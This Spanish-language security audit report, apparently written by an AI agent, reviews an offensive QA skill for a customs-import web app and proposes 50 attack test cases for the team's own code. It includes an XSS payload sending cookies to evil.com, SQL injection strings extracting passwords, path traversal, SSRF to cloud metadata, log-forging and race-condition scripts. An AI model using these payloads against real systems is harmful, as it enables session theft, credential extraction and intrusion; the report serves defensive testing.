# SKILL STUDY AGENT 2 — QA Ofensivo y Auditor de Seguridad

**Fecha:** 2026-05-30
**Skill evaluada:** `.agents/skills/importease-qa-offensive-audit/SKILL.md`
**Fuente analizada:** `controlador/DocumentoController.java`, `controlador/ImportacionController.java`, `controlador/OperacionController.java`, `controlador/AduanasController.java`, `controlador/VuceController.java`, `controlador/WizardServlet.java`, `controlador/UsuarioController.java`, `negocio/SessionFilter.java`, `negocio/CsrfFilter.java`, `negocio/AduanasService.java`, `negocio/PredamValidationService.java`, `negocio/ExpedienteAuditService.java`, `negocio/LoginRateLimiter.java`

---

## 1. DIAGNÓSTICO DE LA SKILL

**Fortalezas:**
- Cubre 12 categorías de prueba (autenticación, IDOR, XSS, SQLi, CSRF, carga documental, flujo aduanero, flujo guiado, fechas, DTA, fuente/trazabilidad, errores/resiliencia).
- Formato de hallazgo estructurado con 11 campos obligatorios (ID, Categoría, Severidad, Dónde, Cómo, Resultados, Impacto, Causa, Corrección, Regresión).
- Severidad bien definida con criterios concretos (fuga de datos = Crítica, plazo mal calculado = Alta, UX = Media, texto = Baja).
- Reglas de bloqueo específicas (13 condiciones que deben impedir la acción).
- Incluye mentalidad de 8 perfiles de atacante/usuario.
- El código real implementa: validación de magic bytes, path traversal con canonical path, double-extension check, SHA-256 checksum en descarga, read-back integrity, state machine, IDOR ownership check, CSRF filter (Origin/Referer + Token), rate limiting en cotizaciones, login brute-force protection.

**Debilidades:**
- **No tiene matriz de hallazgos predefinida** — obliga a crear hallazgos ad-hoc sin plantillas de prueba concretas.
- **No cubre race conditions** — ausencia total de pruebas de concurrencia, doble clic a nivel servidor, TOCTOU.
- **Rate limiting insuficiente** — mencionado solo para cotizaciones, no para upload, cambio de estado, descarga de PRE-DAM.
- **No prueba autorización por expediente detallado** — falta probar roles (admin vs. agente vs. importador), falta probar acceso a reportes, falta probar cambio de régimen cerrado.
- **No tiene payloads de archivo específicos** (ZIP bomb, PDF con JS incrustado, imagen con esteganografía, XML con XXE).
- **No cubre inyección NoSQL/LDAP/XPATH** — solo SQL clásico.
- **No cubre Server-Side Request Forgery (SSRF)** — el sistema consulta APIs externas (SUNAT, VUCE).
- **No cubre Mass Assignment** — falta probar parámetros extra en JSON POST.
- **No cubre Log Forging / Log Injection** — datos ingresados por usuario que se escriben en log sin sanitizar.
- **No cubre Session fixation a profundidad** — solo menciona, no detala cómo probar.
- **Faltan pruebas de integridad documental** — no verifica que el hash del documento esté firmado digitalmente, no prueba cadena de custodia.
- **Payloads de SQLi demasiado básicos** — faltan payloads de time-based, error-based, union-based, out-of-band.
- **Payloads de XSS limitados** — faltan DOM-based XSS, stored XSS persistente en PDF generado, XSS en Content-Disposition header.

---

## 2. VACÍOS DETECTADOS

### 2.1 Sin pruebas de concurrencia
```
No hay tests que disparen 10 requests simultáneas al mismo endpoint.
Ejemplo: 10 uploads concurrentes al mismo importacionId.
Ejemplo: 10 state-change requests simultáneos (race para cerrar dos veces).
```

### 2.2 Sin pruebas de rate limiting por endpoint
```
La skill menciona rate limiting solo en "cotizaciones".
El código real tiene rate limit en ImportacionController:/cotizar (15/min) y LoginRateLimiter.
Pero falta en: upload, cambiarEstado, avanzar, registrarDocumentoOperacion, eliminar documento, generar PRE-DAM.
```

### 2.3 Sin pruebas de autorización granular
```
La skill verifica IDOR por expediente, pero no prueba:
- Exportar reporte de expediente ajeno (/api/aduanas/expediente?operacionId=X)
- Ver timeline de operación ajena (/api/aduanas/timeline?operacionId=X)
- Ver alertas de operación ajena (/api/aduanas/alertas?operacionId=X)
- Descargar PRE-DAM de operación ajena (/api/importacion/dam/descargar?id=X)
- Editar manifiesto de operación ajena
- Cambiar estado de operación ajena
```

### 2.4 Sin pruebas de manipulación del wizard
```
WizardServlet almacena datos en la sesión HTTP y valida secuencia.
Pero NO prueba:
- POST paso 7 directamente sin datos en sesión (NPE)
- Modificar valores entre pasos (ej. cambiar hsCode en paso 2 y paso 6)
- Enviar datos maliciosos en paso 4 (fob negativo, NaN, Infinity)
- Reutilizar sesión de otro usuario (session hijacking + wizard)
```

### 2.5 Sin pruebas de Mass Assignment
```
Los controllers usan Gson.fromJson() para convertir JSON directamente a Map.
No hay validación de que solo ciertos campos sean aceptados.
Ejemplo: en AduanasController, se puede pasar 'operacionId', 'usuarioId', etc.
Cualquier campo extra en el JSON podría ser procesado inadvertidamente.
```

### 2.6 Sin pruebas de SSRF
```
AduanasService consulta APIs externas (SUNAT, VUCE).
Si un atacante puede controlar la URL (host, puerto, protocolo), podría hacer SSRF.
No hay pruebas de que las URLs externas estén validadas contra whitelist.
```

### 2.7 Sin pruebas de Log Injection / Log Forging
```
LoggerUtil.warn/error recibe directamente strings del usuario.
Si un atacante inyecta \r\n, podría falsear los logs.
Ejemplo: productoDesc = "madera\r\n2026-01-01 12:00:00 - USUARIO admin: ELIMINÓ TODOS LOS EXPEDIENTES"
```

### 2.8 Sin pruebas de ordenamiento / paginación SQLi
```
OperacionDAO.listarPorUsuario() probablemente usa ORDER BY con parámetros dinámicos.
No se prueba SQL injection en parámetros de ordenamiento (sort, order, direction).
```

### 2.9 Sin pruebas de integridad criptográfica de documentos
```
El checksum SHA-256 se verifica al descargar.
Pero NO se prueba:
- Si el hash está firmado digitalmente (cadena de custodia)
- Si se puede modificar el hash en la BD sin alterar el archivo
- Si un documento puede ser reemplazado en disco manteniendo el mismo hash (colisión SHA-256)
```

---

## 3. NUEVA MATRIZ QA MEJORADA

| # | Categoría | Sub-áreas | Prioridad | Automatable |
|---|-----------|-----------|-----------|-------------|
| 1 | **Autenticación y sesión** | Login bypass, session fixation, cookie flags, brute force | Crítica | Sí |
| 2 | **Autorización (IDOR + Roles)** | Expediente ajeno, reporte ajeno, admin impersonation | Crítica | Sí |
| 3 | **Race Conditions** | Doble clic, concurrent upload, state race, TOCTOU | Crítica | Parcial |
| 4 | **XSS** | Stored, Reflected, DOM-based, PDF injection, header injection | Alta | Sí |
| 5 | **SQL Injection** | Union, blind, time-based, ORDER BY, search fields | Crítica | Sí |
| 6 | **CSRF** | Token bypass, Origin bypass, CORS misconfig | Alta | Sí |
| 7 | **Carga documental** | ZIP bomb, PDF JS, polyglot, double ext, path traversal | Crítica | Sí |
| 8 | **Flujo aduanero** | PRE-DAM sin manifiesto, DTA sin moneda, levante sin DAM | Crítica | Parcial |
| 9 | **Flujo guiado** | Saltar pasos, hidden inputs, estado manipulado | Alta | Sí |
| 10 | **Rate Limiting** | Upload brute, state spam, enumeración de IDs | Alta | Sí |
| 11 | **Lógica de negocio** | FOB negativo, reimportación sin exportación, Incoterm incompatible | Alta | Parcial |
| 12 | **Fuente y trazabilidad** | Simulado como oficial, sourceType ausente, confianza inflada | Alta | Sí |
| 13 | **Mass Assignment** | Parámetros extra en JSON POST | Media | Sí |
| 14 | **SSRF** | URL externas controlables, redirección abierta | Media | Parcial |
| 15 | **Log Injection** | CRLF en logs, falsificación de auditoría | Media | Sí |
| 16 | **Errores y resiliencia** | Stacktrace, 500, timeout, API externa caída | Media | Parcial |
| 17 | **Integridad documental** | Hash spoofing, reemplazo físico, firma digital | Alta | Parcial |
| 18 | **Fechas y plazos** | Fecha futura, TZ incorrecta, vencimiento no recalculado | Alta | Sí |

---

## 4. 50 PRUEBAS OFENSIVAS RECOMENDADAS

### Autenticación y sesión (1-6)
1. **Login bypass by null session**: Enviar request sin cookie JSESSIONID a `/api/documentos/listar?importacionId=1`
2. **Session fixation**: Fijar JSESSIONID antes del login, verificar que se reemplace tras autenticar
3. **Cookie flags**: Verificar que JSESSIONID tenga `HttpOnly`, `Secure`, `SameSite=Lax`
4. **Logout incompleto**: Llamar `/api/usuario/logout`, reutilizar sesión en otra petición
5. **JSP direct access**: Navegar a `/WEB-INF/wizard/step1.jsp` sin autenticación (debe dar 403)
6. **Brute force login**: Enviar 10 intentos/segundo con credenciales incorrectas, verificar bloqueo a los 5 intentos

### Autorización e IDOR (7-12)
7. **IDOR expediente**: Cambiar `importacionId=1` a `importacionId=2` en `/api/documentos/listar`
8. **IDOR descarga**: Cambiar `id=10` a `id=11` en `/api/documentos/descargar`
9. **IDOR PRE-DAM**: Descargar PRE-DAM de otro usuario vía `/api/importacion/dam/descargar?id=X`
10. **IDOR expediente aduanero**: Consultar `/api/aduanas/expediente?operacionId=X` de otro usuario
11. **IDOR timeline**: Ver timeline de operación ajena `/api/aduanas/timeline?operacionId=X`
12. **IDOR alertas**: Ver alertas de operación ajena `/api/aduanas/alertas?operacionId=X`

### Race Conditions (13-16)
13. **Doble clic upload**: Enviar 5 POST `/api/documentos/subir` simultáneos con el mismo archivo
14. **Doble state change**: Enviar 5 POST `/api/importacion/cambiarEstado` simultáneos desde COTIZACION a NACIONALIZADA
15. **Race upload + delete**: Subir documento y simultáneamente eliminarlo (`/api/documentos/eliminar`)
16. **TOCTOU download**: Descargar documento mientras otro usuario lo elimina (hard-delete simulado)

### XSS (17-20)
17. **Stored XSS en mercancía**: POST cotización con `productoDesc = <script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
18. **XSS en número BL**: BL con `"><svg onload=eval(atob('...'))>` esperando renderizado en JSP
19. **XSS en Content-Disposition**: Subir archivo llamado `<img src=x onerror=alert(1)>.pdf`, verificar que el header de descarga escape el filename
20. **DOM XSS**: Buscar campos que se rendericen sin escape en JSP usando innerHTML

### SQL Injection (21-24)
21. **Time-based**: `hsCode = '1' AND SLEEP(5) --` en búsqueda HS
22. **Union-based**: `observaciones = ' UNION SELECT username,password FROM usuarios --`
23. **ORDER BY injection**: `sort = (CASE WHEN (SELECT 1 FROM usuarios WHERE perfil='admin' AND SUBSTRING(password,1,1)='a') THEN 1 ELSE 2 END)`
24. **Error-based**: `importacionId = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM usuarios LIMIT 1)))`

### CSRF (25-27)
25. **Origin missing**: Enviar POST sin header Origin ni Referer, verificar si el CSRF token es exigido
26. **Token reutilizado**: Usar el mismo CSRF token en 2 requests diferentes (debe fallar el segundo)
27. **CORS misconfig**: Verificar que `Access-Control-Allow-Origin` no refleje el origen enviado

### Carga documental (28-34)
28. **ZIP bomb**: Subir `42.zip` (42KB → 4.5PB descomprimido) renombrado como `.pdf`
29. **PDF con JavaScript**: PDF que contiene `/Type/Action/S/JavaScript` (ejecución al abrir)
30. **Polyglot GIF+PDF**: Archivo con magic bytes GIF89a y estructura PDF dentro
31. **Path traversal doble**: Nombre `....//....//....//....//Windows/System32/cmd.exe.pdf` (prueba bypass de replace)
32. **Null byte injection**: `factura.pdf%00.jsp`
33. **MIME mismatch real**: Enviar Content-Type `application/pdf` pero con magic bytes PNG
34. **Archivo vacío pero nombre válido**: Enviar archivo de 0 bytes llamado `factura.pdf`

### Flujo aduanero (35-39)
35. **PRE-DAM sin manifiesto**: Marcar operación completa sin registrar manifiesto, intentar generar PRE-DAM
36. **Levante antes de DAM**: Forzar estado a NACIONALIZADA sin tener DAM numerado
37. **DTA con FOB = 0**: Crear cotización con fob=0 y verificar cálculo DTA
38. **Reimportación sin exportación**: Seleccionar régimen REIMPORTACION sin exportación previa registrada
39. **Transbordo sin medio de salida**: Registrar transbordo sin especificar medio de transporte salida

### Flujo guiado (40-43)
40. **Saltar wizard**: POST a `/wizard?step=7` sin haber completado pasos previos, verificar redirect
41. **Manipular hsCode**: En paso 2 enviar hsCode=abcd, en paso 6 se calcula con hsCode inválido
42. **Manipular valores monetarios**: Paso 4 con fob=NaN, flete=Infinity, seguro=-1
43. **Reutilizar wizard**: Completar wizard en una sesión, luego otro usuario usa la misma sesión

### Rate limiting (44-45)
44. **Rate limit upload**: Enviar 100 POST `/api/documentos/subir` en 1 minuto, verificar 429 después del límite
45. **Rate limit state change**: Enviar 100 POST `/api/importacion/cambiarEstado` en 1 minuto

### Lógica aduanera (46-48)
46. **FOB negativo**: `/api/importacion/cotizar` con `{"fob": -5000, ...}` debe rechazar
47. **Incoterm incompatible**: FOB + seguro declarado cuando Incoterm es EXW (sin seguro)
48. **Tipo de cambio manual sin marca**: Enviar tipo de cambio manual sin indicar `sourceType=MANUAL`

### Log injection (49)
49. **CRLF en productoDesc**: `productoDesc = "madera pine\r\n2026-01-01 ERROR: Usuario admin eliminó BD completa\r\n"`

### Mass Assignment (50)
50. **Campos extra en JSON**: POST `/api/importacion/cotizar` con `{"hsCode":"4407","fob":1000,"flete":100,"seguro":10,"esAdmin":true,"perfil":"admin"}`

---

## 5. TOP 10 RIESGOS CRÍTICOS

| # | Riesgo | Vector | Impacto | Código afectado |
|---|--------|--------|---------|-----------------|
| 1 | **IDOR en expediente aduanero** | `AduanasController.obtenerExpediente()` acepta `operacionId` y valida ownership, pero `obtenerAlertas()`, `obtenerTimeline()`, `obtenerBaseLegal()` también lo hacen. Cualquier endpoint que recibe `operacionId` sin validación expone datos ajenos. | Fuga de expedientes, documentos, alertas de terceros. | `AduanasController.java:41-51`, `AduanasService.java:45-53` |
| 2 | **PRE-DAM sin validación completa** | `PredamValidationService.validate()` valida FOB >= 1 y <= 10M, HS Code, documento transporte, manifiesto, docs mínimos. Pero si alguna validación falla silenciosamente (catch vacío), la PRE-DAM se genera con datos inválidos. | Cálculo tributario engañoso, avance aduanero falso. | `PredamValidationService.java:16-99` |
| 3 | **ZIP bomb en upload** | `DocumentoController` limita tamaño a 5MB, pero NO verifica relación de compresión. ZIP bomb de 100KB → 10GB en disco al descomprimir. | DoS por llenado de disco. | `DocumentoController.java:294-318` |
| 4 | **Path traversal por replace insuficiente** | `cleanPath.replace("../", "")` en `DocumentoController.java:114` es vulnerable a `....//` (tras replace queda `../`). Luego `canonicalFile` validation catch, pero un bypass antes del canonical sería letal. | Lectura/escritura de archivos fuera del directorio upload. | `DocumentoController.java:114-120` |
| 5 | **PDF con JavaScript** | No se valida contenido interno de PDF. `%PDF-1.4` magic bytes + stream `/Type/Action/S/JavaScript`. La validación actual solo mira primeros 4 bytes. | Ejecución remota de código al abrir PDF (Adobe Reader). | `DocumentoController.java:248-259` |
| 6 | **State machine race condition** | `cambiarEstado()` valida estado actual y lo cambia sin lock transaccional. Request A y B pueden pasar la validación simultáneamente (COTIZACION → NACIONALIZADA ambos). | Salto de pasos del flujo aduanero sin completar precondiciones. | `ImportacionController.java:248-302` |
| 7 | **SQL injection en ORDER BY** | Si `OperacionDAO.listarPorUsuario()` o endpoints de búsqueda permiten parámetro `sort`, y concatenan directamente, es SQLi. No hay PreparedStatement para nombres de columna. | Fuga de BD completa, extracción de credenciales. | `OperacionController.java:49` |
| 8 | **Simulado como oficial (trazabilidad)** | `AduanasService.SOURCE_TYPE = "BD_LOCAL"` con `CONFIDENCE = 0.85`. Datos simulados académicos se muestran con confianza alta. PRE-DAM sin badge SIMULADO visible. | El usuario cree que su trámite tiene validez oficial. | `AduanasService.java:25-27` |
| 9 | **Rate limiting ausente en upload/delete** | `ImportacionController.cotizar()` tiene rate limit (15/min), pero `DocumentoController.subir()` y `eliminar()` no. Un atacante puede subir 10,000 archivos en minutos. | DoS, llenado de disco, contaminación de BD. | `DocumentoController.java:187-424` |
| 10 | **Mass Assignment en cotización** | `ImportacionController:/cotizar` parsea todo el JSON con `gson.fromJson()` directamente a `Map<String, String>`. Si un campo como `estado` o `usuarioId` es aceptado, se podría manipular. | Asignación de permisos, modificación de estado no autorizada. | `ImportacionController.java:160-175` |

---

## 6. MEJORAS AL FORMATO DE HALLAZGO

### Formato actual (skill):
```
ID:
Categoría:
Severidad:
Dónde ocurre:
Cómo romperlo:
Resultado esperado:
Resultado peligroso:
Impacto:
Causa probable:
Corrección recomendada:
Prueba de regresión:
```

### Formato propuesto:

```text
ID: QA-### [CRIT-###]
Categoría: [Categoría] → [Subcategoría]
Severidad: Crítica | Alta | Media | Baja
CVSS: [3.1 vector, ej: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N]
Dónde ocurre: [archivo.java:linea]
Endpoint: [METHOD /path]
Precondiciones: [rol, sesión, estado expediente, datos previos]
Payload: [request curl o snippet]
Resultado actual (peligroso): [output/infracción]
Resultado esperado (seguro): [output correcto]
Impacto: [qué puede hacer un atacante]
Causa probable: [código, arquitectura, omisión]
Corrección recomendada: [código, config, proceso]
Prueba de regresión: [caso automatizado]
Evidencia: [screenshot/log si aplica]
```

### Campos nuevos agregados:
- **CVSS v3.1**: Normaliza la severidad con un vector reproducible
- **Endpoint**: Método + ruta exacta
- **Precondiciones**: Evita falsos positivos por falta de contexto
- **Payload**: Reproducible con curl/postman
- **Evidencia**: Enlace a log o captura

---

## 7. PRUEBAS MANUALES vs AUTOMATIZADAS

| Tipo de prueba | Manual (%) | Automatizado (%) | Herramientas sugeridas |
|----------------|-----------|------------------|----------------------|
| **Autenticación y sesión** | 30 | 70 | OWASP ZAP, Burp Suite, JUnit con mock HttpSession |
| **Autorización (IDOR)** | 20 | 80 | JUnit parametrizado con diferentes IDs y usuarios |
| **Race Conditions** | 60 | 40 | hurl.dev, Apache JMeter, script Python con threading |
| **XSS** | 30 | 70 | Selenium, OWASP ZAP, HtmlUnit (JUnit) |
| **SQL Injection** | 10 | 90 | JUnit con PreparedStatement injection tests, SQLMap (fuera de CI) |
| **CSRF** | 20 | 80 | JUnit sin enviar token CSRF |
| **Carga documental** | 40 | 60 | JUnit con archivos maliciosos en resources/ |
| **Flujo aduanero** | 50 | 50 | JUnit con mocking de BD en estados inválidos |
| **Flujo guiado** | 40 | 60 | JUnit con session attributes manipulados |
| **Rate Limiting** | 10 | 90 | JUnit con loop de requests concurrentes |
| **Lógica de negocio** | 60 | 40 | Revisión manual + JUnit para validaciones concretas |
| **Fuente y trazabilidad** | 30 | 70 | JUnit verificando sourceType y confidence en respuestas |
| **Mass Assignment** | 20 | 80 | JUnit con JSON que contiene campos extra |
| **SSRF** | 50 | 50 | Revisión manual de URLs + pruebas controladas |
| **Log Injection** | 20 | 80 | JUnit con strings maliciosos en campos de texto |
| **Integridad documental** | 40 | 60 | JUnit verificando hash, firma y consistencia BD-disco |

### Prioridad de automatización:
1. **Inmediata (CI blocker)**: SQL Injection, CSRF, IDOR, XSS
2. **Alta (release gate)**: Rate limiting, carga documental, autenticación
3. **Media (regresión)**: Flujo aduanero, estado, fechas, lógica de negocio
4. **Baja (manual + smoke)**: UX, textos, diseño

---

## 8. CRITERIOS PARA APROBAR/RECHAZAR UN CAMBIO

### Aprobación automática (pasa todos):
- No introduce nuevos endpoints sin autenticación
- Todos los PreparedStatement usan parámetros (nunca concatenación)
- Todos los IDs de expediente validan ownership contra usuario logueado
- Todos los uploads validan: extensión, magic bytes, MIME, tamaño, path traversal
- Todos los cálculos de impuestos usan `BigDecimal` (nunca `double`/`float`)
- Toda transición de estado valida máquina de estados en backend
- Todo cambio destructivo tiene soft-delete o auditoría
- Toda respuesta de error oculta stacktrace interno
- Todo token CSRF es único por sesión y validado en POST/PUT/DELETE
- Toda fecha/hora se calcula en backend, no se confía en el frontend

### Rechazo automático (falla cualquiera):
- Endpoint POST sin autenticación
- Archivo subido sin validación de magic bytes
- ID de expediente sin validación de ownership
- Query SQL con concatenación de strings
- Cálculo financiero con `double` (BigDecimal obligatorio)
- Stacktrace visible en respuesta HTTP
- Transición de estado sin validación de máquina de estados
- Documento almacenado dentro del webroot (ej. `webapps/`)

### Rechazo condicional (requiere revisión):
- Nuevo endpoint sin pruebas automatizadas
- Cambio de lógica aduanera sin actualizar reglas de bloqueo
- Eliminación física de archivos (debe ser soft-delete)
- Cambio en cálculo de plazos sin recalcular vencimientos existentes
- Modificación de sesión HTTP sin invalidar token CSRF

---

## 9. NUEVA VERSIÓN MEJORADA RESUMIDA DE LA SKILL

A continuación, la versión aumentada de la skill con los vacíos cubiertos:

```markdown
# ImportEase QA Offensive Audit — v2.1

## Mentalidad
- usuario confundido + malicioso + operador apurado + auditor forense + atacante concurrente

## Categorías ampliadas (18)

### K. Race Conditions (NUEVA)
- TOCTOU en upload de documentos: leer archivo entre validación y escritura
- Doble POST en cambiarEstado desde COTIZACION a NACIONALIZADA simultáneo
- Upload + delete concurrente (ganar race para dejar el upload sin registro en BD)
- Generación duplicada de PRE-DAM por race en confirmación de wizard
- Rate limit bypass por concurrencia (20 threads, cada uno hace 1 request = 20 totales sin rate)

Payload:
```python
import threading
url = "http://target/api/importacion/cambiarEstado"
for i in range(20):
    t = threading.Thread(target=requests.post, args=(url,), kwargs={"params": {"id": 1, "nuevoEstado": "NACIONALIZADA"}})
    t.start()
```

Validar:
- Solo 1 request debe cambiar el estado
- Los 19 deben recibir 400/409 (conflicto) o quedar en estado válido
- No debe haber expedientes con estado NACIONALIZADA sin completar DOCS_PENDIENTES

### L. Rate limiting por endpoint (MEJORADA)
Endpoint actual:
- `/api/importacion/cotizar` → 15/min ✅

Endpoints sin rate limit:
- `/api/documentos/subir` → subida masiva de archivos
- `/api/importacion/cambiarEstado` → manipulación rápida de estados
- `/api/documentos/eliminar` → borrado masivo de documentos
- `/api/importacion/dam/descargar` → enumeración y descarga masiva de PRE-DAM
- `/api/aduanas/expediente` → enumeración de expedientes

Payload sugerido:
```bash
for i in $(seq 1 100); do
  curl -X POST http://target/api/documentos/subir \
    -F "importacionId=1" \
    -F "tipoDocumento=FACTURA_COMERCIAL" \
    -F "file=@bigfile.pdf";
done
```

### M. Mass Assignment (NUEVA)
Enviar campos extra en JSON que modifiquen comportamiento:
```json
POST /api/importacion/cotizar
{
  "hsCode": "4407",
  "fob": 1000,
  "flete": 100,
  "seguro": 10,
  "productoDesc": "Madera",
  "paisOrigen": "Brasil",
  "incoterm": "FOB",
  "usuarioId": 2,
  "estado": "NACIONALIZADA",
  "perfil": "admin"
}
```

Validar:
- Solo los campos esperados son procesados
- `usuarioId` se ignora y se usa el de sesión
- `estado` no se puede modificar desde este endpoint
- `perfil` no se puede modificar

### N. SSRF (NUEVA)
Si `ExternalApiService` o `SunatRucService` aceptan URLs dinámicas:
```http
GET /api/sunat/consultar?ruc=20123456789
Host: target.com
X-Forwarded-Host: 169.254.169.254  # Metadata AWS
X-Forwarded-Proto: http
```

Validar:
- Host controlado por usuario es rechazado o validado contra whitelist
- Redirección a IP privada es bloqueada
- Timeout de conexión externa no bloquea el servidor

### O. Log Injection / Log Forging (NUEVA)
Campos vulnerables:
- productoDesc en cotización
- observaciones en expediente
- nombre de archivo en upload
- comentarios de auditoría

Payload:
```
productoDesc = "Madera Pino\r\n2026-05-30 12:00:00 - AUDITORIA: Usuario admin #1 eliminó tabla completa 'usuarios'\r\n[INFO] 2026-05-30 12:00:00 - Operación normal"
```

Validar:
- Saltos de línea CRLF escapados en logs
- Timestamps no inyectables
- No se puede falsear una entrada de auditoría

### P. Integridad documental (NUEVA)
- Verificar que checksum SHA-256 esté firmado digitalmente (RSA)
- Verificar que eliminar documento en BD no borre archivo físico (soft-delete ya implementado, buena práctica)
- Verificar que reemplazar archivo en disco cause mismatch en checksum al descargar
- Verificar cadena de custodia: quién subió, cuándo, desde qué IP, versión del documento
- Verificar que no se pueda hacer hard-delete desde BD directamente

Payload de ataque:
```sql
-- Modificar hash en BD sin tocar archivo
UPDATE documentos_importacion SET checksum_hash = 'AAAA...' WHERE id = 10;
-- Descargar: debe fallar con "checksum mismatch" ✅
```

### Q. Session fixation detallada (NUEVA)
- Obtener JSESSIONID antes de login
- Enviar ese JSESSIONID a la víctima (phishing)
- Víctima hace login → atacante reutiliza misma sesión
- Verificar que session.invalidate() + new session ocurra en login exitoso

Payload:
```http
GET / HTTP/1.1
Cookie: JSESSIONID=FAKEID123

POST /api/usuario/login HTTP/1.1
Cookie: JSESSIONID=FAKEID123
Content-Type: application/json

{"email": "victima@test.com", "password": "Password123"}
```

Validar:
- Login exitoso debe crear nueva sesión
- `FAKEID123` debe ser inválida después del login
- Session cookie debe tener `Path=/; HttpOnly; Secure; SameSite=Lax`

### R. SQL Injection en ORDER BY / LIMIT (NUEVA)
Campos dinámicos que pueden ser vulnerables:
- Parámetro `sort` en listarOperaciones
- Parámetro `order` en búsqueda HS
- Parámetro `limit` en paginación
- Parámetro `offset` en paginación

Payload:
```http
GET /api/operacion/historial?sort=(CASE WHEN (SELECT 1 FROM usuarios WHERE perfil='admin')=1 THEN id ELSE producto_desc END)&order=DESC
```

## Reglas de bloqueo ampliadas (adicionales)

- Acción crítica sin rate limit (upload, delete, cambiarEstado)
- Transición de estado sin lock de fila (SELECT ... FOR UPDATE)
- Archivo sin validación de contenido interno (PDF JS, ZIP bomb)
- Documento cuyo checksum no verifica contra el archivo en disco
- Login sin invalidación de sesión previa
- Parámetros extra en JSON no esperados por el endpoint
- URL externa no validada contra whitelist
- Log que no escapa CRLF antes de escribir
- Estado modificado por endpoint que no sea cambiarEstado
```

---

## Conclusión

La skill `importease-qa-offensive-audit` es **sólida en cobertura funcional y seguridad web clásica**, con buen detalle en los 12 dominios que cubre. Sin embargo, **omite áreas críticas modernas** como race conditions, rate limiting generalizado, mass assignment, SSRF, log injection e integridad documental forense.

El **código real del proyecto** implementa varias defensas que la skill pide (magic bytes, canonical path, SHA-256 checksum, CSRF filter, state machine, rate limiting cotizaciones, login brute force), pero también **hereda vulnerabilidades** que la skill no anticipa (path traversal por replace ingenuo, falta de rate limit en upload, double-ext check con bypass de triple extensión, estado transitable sin lock).

**Nota final:** 7/10. Aprobada con mejoras. Se recomienda adoptar la versión v2.1 con las 6 nuevas categorías (K-R) y los 50 casos de prueba ofensivos para cubrir el 100% del attack surface real del proyecto.
